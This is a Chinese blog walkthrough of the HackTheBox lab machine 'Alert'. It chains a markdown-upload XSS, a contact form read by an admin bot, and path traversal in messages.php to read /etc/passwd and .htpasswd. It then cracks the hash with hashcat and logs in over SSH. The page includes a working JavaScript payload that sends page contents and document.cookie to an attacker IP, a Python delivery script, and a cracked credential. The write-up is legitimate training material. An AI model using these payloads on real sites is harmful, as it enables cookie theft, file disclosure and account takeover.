<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Alert-writeup | Welcome to my blog</title><meta name="author" content="Ekk0"><meta name="copyright" content="Ekk0"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="HTB machine Alert workthrough: step1: 在&#x2F;etc&#x2F;hosts 中添加10.10.11.44 alert.htb保证能够直接通过浏览器访问 step2：访问alert.htb会发现可以上传一个markdown文件，服务器是对markdown有足够的校验的，如下(是ssh后才能读到源代码的，方便起见直接放出来)index.php route:">
<meta property="og:type" content="article">
<meta property="og:title" content="Alert-writeup">
<meta property="og:url" content="https://noobctfer.github.io/2024/12/08/alert/index.html">
<meta property="og:site_name" content="Welcome to my blog">
<meta property="og:description" content="HTB machine Alert workthrough: step1: 在&#x2F;etc&#x2F;hosts 中添加10.10.11.44 alert.htb保证能够直接通过浏览器访问 step2：访问alert.htb会发现可以上传一个markdown文件，服务器是对markdown有足够的校验的，如下(是ssh后才能读到源代码的，方便起见直接放出来)index.php route:">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://noobctfer.github.io/img/pika.png">
<meta property="article:published_time" content="2024-12-08T15:35:52.000Z">
<meta property="article:modified_time" content="2024-12-12T14:36:57.088Z">
<meta property="article:author" content="Ekk0">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://noobctfer.github.io/img/pika.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://noobctfer.github.io/2024/12/08/alert/index.html"><link rel="preconnect" href="//unpkg.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://unpkg.com/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'undefined')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'undefined')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://unpkg.com/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Alert-writeup',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: false,
  isShuoshuo: false
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/background.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/pika.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">8</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-folder-open"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-inbox"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/categories/resources"><i class="fa-fw fas fa-download"></i><span> 资源</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/background.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/pika.png" alt="Logo"><span class="site-name">Welcome to my blog</span></a><a class="nav-page-title" href="/"><span class="site-name">Alert-writeup</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-folder-open"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-inbox"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/categories/resources"><i class="fa-fw fas fa-download"></i><span> 资源</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Alert-writeup</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-12-08T15:35:52.000Z" title="发表于 2024-12-08 23:35:52">2024-12-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-12-12T14:36:57.088Z" title="更新于 2024-12-12 22:36:57">2024-12-12</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/htb-machine/">htb-machine</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">1.9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>9分钟</span></span><span class="post-meta-separator">|</span><span class="leancloud_visitors" id="/2024/12/08/alert/" data-flag-title="Alert-writeup"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span class="leancloud-visitors-count"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="page"><div class="container" id="article-container"><p>HTB machine Alert workthrough:</p>
<p>step1:</p>
<p>在&#x2F;etc&#x2F;hosts 中添加<br>10.10.11.44 alert.htb<br>保证能够直接通过浏览器访问</p>
<p>step2：<br>访问alert.htb会发现可以上传一个markdown文件，服务器是对markdown有足够的校验的，如下(是ssh后才能读到源代码的，方便起见直接放出来)<br>index.php</p>
<p>route:  &#x2F;index.php?page&#x3D;alert</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;css/style.css&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Alert - Markdown Viewer&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;nav&gt;</span><br><span class="line">        &lt;a href=<span class="string">&quot;index.php?page=alert&quot;</span>&gt;Markdown Viewer&lt;/a&gt;</span><br><span class="line">        &lt;a href=<span class="string">&quot;index.php?page=contact&quot;</span>&gt;Contact Us&lt;/a&gt;</span><br><span class="line">        &lt;a href=<span class="string">&quot;index.php?page=about&quot;</span>&gt;About Us&lt;/a&gt;</span><br><span class="line">        &lt;a href=<span class="string">&quot;index.php?page=donate&quot;</span>&gt;Donate&lt;/a&gt;</span><br><span class="line">        <span class="meta">&lt;?php</span></span><br><span class="line">        <span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$ip</span> == <span class="string">&#x27;127.0.0.1&#x27;</span> || <span class="variable">$ip</span> == <span class="string">&#x27;::1&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?page=messages&quot;&gt;Messages&lt;/a&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">?&gt;</span></span><br><span class="line">    &lt;/nav&gt;</span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">        <span class="title">if</span> (<span class="title">isset</span>($<span class="title">_GET</span>[&#x27;<span class="title">page</span>&#x27;])) </span>&#123;</span><br><span class="line">            <span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">switch</span> (<span class="variable">$page</span>) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;alert&#x27;</span>:</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;h1&gt;Markdown Viewer&lt;/h1&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;div class=&quot;form-container&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;form action=&quot;visualizer.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;input type=&quot;file&quot; name=&quot;file&quot; accept=&quot;.md&quot; required&gt;</span></span><br><span class="line"><span class="string">                &lt;input type=&quot;submit&quot; value=&quot;View Markdown&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;/form&gt;</span></span><br><span class="line"><span class="string">          &lt;/div&gt;&#x27;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;contact&#x27;</span>:</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;h1&gt;Contact Us&lt;/h1&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;div class=&quot;form-container&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;status&#x27;</span>]) .</span><br><span class="line">      <span class="string">&#x27;  &lt;form action=&quot;contact.php&quot; method=&quot;post&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;email&quot; name=&quot;email&quot; placeholder=&quot;Your email&quot; required&gt;</span></span><br><span class="line"><span class="string">            &lt;textarea name=&quot;message&quot; placeholder=&quot;Your message&quot; rows=&quot;4&quot; required&gt;&lt;/textarea&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;submit&quot; value=&quot;Send&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string">      &lt;/div&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;about&#x27;</span>:</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;&lt;h1&gt;About Us&lt;/h1&gt;&#x27;</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;Hello! We are Alert. Our service gives you the ability to view MarkDown. We are reliable, secure, fast and easy to use. If you experience any problems with our service, please let us know. Our administrator is in charge of reviewing contact messages and reporting errors to us, so we strive to resolve all issues within 24 hours. Thank you for using our service!&lt;/p&gt;&#x27;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;messages&#x27;</span>:</span><br><span class="line">                    <span class="keyword">require</span> <span class="string">&#x27;messages.php&#x27;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;donate&#x27;</span>:</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;&lt;h1&gt;Support Us&lt;/h1&gt;&#x27;</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;Your donation helps improve Markdown visualization, providing a better user experience for everyone.&lt;/p&gt;&#x27;</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;&lt;div class=&quot;form-container&quot;&gt;</span></span><br><span class="line"><span class="string">                            &lt;form action=&quot;#&quot; method=&quot;post&quot;&gt;</span></span><br><span class="line"><span class="string">                                &lt;input type=&quot;number&quot; name=&quot;amount&quot; placeholder=&quot;Enter amount&quot; required&gt;</span></span><br><span class="line"><span class="string">                                &lt;input type=&quot;submit&quot; value=&quot;Donate&quot;&gt;</span></span><br><span class="line"><span class="string">                            &lt;/form&gt;</span></span><br><span class="line"><span class="string">                          &lt;/div&gt;&#x27;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;&lt;h1&gt;Error: Page not found&lt;/h1&gt;&#x27;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: index.php?page=alert&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">?&gt;</span></span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;footer&gt;</span><br><span class="line">        &lt;p style=<span class="string">&quot;color: black;&quot;</span>&gt;© <span class="number">2024</span> Alert. All rights reserved.&lt;/p&gt;</span><br><span class="line">    &lt;/footer&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>但是测试发现markdown文件包含script则能够在自己的浏览器上触发xss<br>step3：<br>route:  &#x2F;index.php?page&#x3D;contact<br>服务器不是直接包含.md文件，就是读进来而已，并且限制了文件的后缀和文件名中只能有一些合法的字符，这防止了.md的目录遍历<br>实际上黑盒测试中about页面已经提示你后台有个bot会看你的message，一猜就知道是xss，可以先在本地<code>nc -lnvp 1337</code>,然后发送<code>&lt;script&gt;location=&quot;http://10.10.xx.xx:1337&quot;</code>去测试<br>连通性，注意只能用你vpn主机的ip，不能用公共域名，否则收不到tcp连接，并且不需要填充后面的scrip标签，原因是你本地nc测试之后会发现后面的部分只是累赘，会被<br>html编码。</p>
<p>step4：<br>route:  &#x2F;visualizer.php?link_share&#x3D;xxxxxx, &#x2F;index.php?page&#x3D;contact<br>连通性测试完成后就想办法让admin去访问一个有xss的页面，为什么不直接在这里xss？因为这里html编码的问题，你自己去试试会发现payload极其难以调试，特<br>别是引号的闭合问题。实际上markdown文件是不会转义html标签的，其中就包括<code>&lt;script&gt;</code>,那么就可以通过重定向到markdown文件来xss，markdown会被编译之后返回回<br>来并且生成一个link_share&#x3D;xxx的公共链接，让admin去访问这个链接就可以执行完整的一个js代码。<br>贴一个python脚本：<br>这个脚本用于触发xss，只要修改你的a.md文件就好</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#xss.py</span></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">url=<span class="string">&quot;http://alert.htb&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_mess</span>(<span class="params">a</span>):</span><br><span class="line">    email=<span class="string">&quot;a@qq.com&quot;</span></span><br><span class="line">    mes=(<span class="string">&quot;&lt;script&gt;location=&#x27;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(a))</span><br><span class="line">    <span class="built_in">print</span>(mes)</span><br><span class="line">    r=requests.post(url+<span class="string">&quot;/contact.php&quot;</span>,data=&#123;<span class="string">&quot;email&quot;</span>:email,<span class="string">&quot;message&quot;</span>:mes&#125;,allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    <span class="built_in">print</span>(r.status_code)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;a.md&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    res=requests.post(url+<span class="string">&quot;/visualizer.php&quot;</span>,files=&#123;<span class="string">&quot;file&quot;</span>:f&#125;</span><br><span class="line">    )</span><br><span class="line"><span class="built_in">print</span>(res.text)    </span><br><span class="line">soup=BeautifulSoup(res.text,<span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">a=soup.find_all(<span class="string">&quot;a&quot;</span>,href=<span class="literal">True</span>)[<span class="number">0</span>][<span class="string">&quot;href&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">send_mess(a)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">a.md</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> readfile=<span class="string">&quot;http://alert.htb/index.php?page=messages&quot;</span>;<span class="comment">//改一下page就好</span></span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">fetch</span>(readfile)</span></span><br><span class="line"><span class="language-javascript">    .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">text</span>())</span></span><br><span class="line"><span class="language-javascript">    .<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;     </span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">fetch</span>(<span class="string">&quot;http://10.10.16.15:1337/?data=&quot;</span> + <span class="built_in">encodeURIComponent</span>(data)+<span class="string">&quot;&amp;cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>);<span class="comment">//改成你的ip,靶机可以直接和你的主机通信</span></span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript">    .<span class="title function_">catch</span>(<span class="function"><span class="params">error</span> =&gt;</span> <span class="title function_">fetch</span>(<span class="string">&quot;http://10.10.16.15:1337/?err=&quot;</span>+error.<span class="property">message</span>));</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>一个用于接受admin的请求的python 服务器:(用nc也可以)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#server.py</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, send_from_directory, abort,request</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">serve_file</span>():</span><br><span class="line">    <span class="built_in">print</span>(request.args.get(<span class="string">&#x27;data&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;200&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行应用</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">1337</span>,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>




<p>用法：先python server.py,然后python xss.py即可（修改 a.md）<br>step5:</p>
<p>有上面的想法后，先去尝试看看admin眼中的&#x2F;index.php，你就会发现有个<code>&lt;a href=&quot;index.php?page=messages&quot;&gt;Messages&lt;/a&gt;</code>,暴露了一个文件出来，然后再让admin去访问这个page，就会发现messages.php接受一个file&#x3D;xxxx参数，并且利用file这个参数可以读取任意文件，比如&#x2F;etc&#x2F;passwd,看看构造的js代码：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> readfile=<span class="string">&quot;http://alert.htb/messages.php?file=../../../../etc/passwd&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">fetch</span>(readfile)</span></span><br><span class="line"><span class="language-javascript">    .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">text</span>())</span></span><br><span class="line"><span class="language-javascript">    .<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;     </span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">fetch</span>(<span class="string">&quot;http://10.10.16.15:1337/?data=&quot;</span> + <span class="built_in">encodeURIComponent</span>(data)+<span class="string">&quot;&amp;cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>);<span class="comment">//改成你的ip,靶机可以直接和你的主机通信</span></span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript">    .<span class="title function_">catch</span>(<span class="function"><span class="params">error</span> =&gt;</span> <span class="title function_">fetch</span>(<span class="string">&quot;http://10.10.16.15:1337/?err=&quot;</span>+error.<span class="property">message</span>));</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>step6:<br>读取&#x2F;etc&#x2F;hosts，发现还有个域名statistics.alert.htb，读取&#x2F;etc&#x2F;apache2&#x2F;sites-available&#x2F;000-default.conf (apache默认配置文件)发现这个域名要密码，<br>并且密码位于.htpasswd，根目录在&#x2F;var&#x2F;www&#x2F;statistics.alert.htb，那么再读取.htpasswd:   albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ&#x2F;<br>etc&#x2F;passwd中其实有albert这个用户，并且可以ssh<br>尝试用hashcat破解密码：.&#x2F;hashcat.exe  -m 1600 -a 0 apachehash.txt rockyou.txt   (在仓库中放着)<br>得到$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ&#x2F;:manchesterunited</p>
<p>step7：<br>ssh <a href="mailto:&#x61;&#x6c;&#98;&#x65;&#114;&#116;&#64;&#x31;&#48;&#x2e;&#x31;&#48;&#x2e;&#49;&#49;&#46;&#52;&#52;" rel="external nofollow noreferrer">&#x61;&#x6c;&#98;&#x65;&#114;&#116;&#64;&#x31;&#48;&#x2e;&#x31;&#48;&#x2e;&#49;&#49;&#46;&#52;&#52;</a> 输入密码，ls 发现user.txt，读取user flag</p>
